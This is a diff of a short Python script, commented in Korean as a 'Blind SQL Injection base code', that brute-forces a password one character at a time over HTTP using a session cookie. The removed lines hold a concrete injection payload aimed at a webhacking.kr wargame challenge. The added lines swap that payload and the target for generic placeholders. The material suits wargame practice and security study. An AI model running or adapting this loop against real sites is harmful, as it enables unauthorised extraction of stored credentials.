@@ -1,25 +1,27 @@
+'''
+Blind SQL Injection 기본 코드 베이스
+'''
 import urllib.request
 from urllib.parse import quote
 
 key = ""
 for i in range(1, 20):
     for j in range(32, 127):
-        url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?no="
-        data = "2 and ascii(substr(pw,{},1))={}".format(
-            str(i),j)
+        url = "고정 URL"
+        data = "가변적 URL"
         print(url + data)
         data = quote(data)
         re = urllib.request.Request(url + data)
 
         re.add_header(
-            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
+            "User-agent", "브라우저 정보")
         re.add_header(
-            "Cookie", "PHPSESSID="
+            "Cookie", "PHPSESSID=세션값"
         )
 
         req = urllib.request.urlopen(re)
 
-        if str(req.read()).find("True") != -1:
+        if str(req.read()).find("찾는 값") != -1:
             key += chr(j).lower()
             print(key)
             break
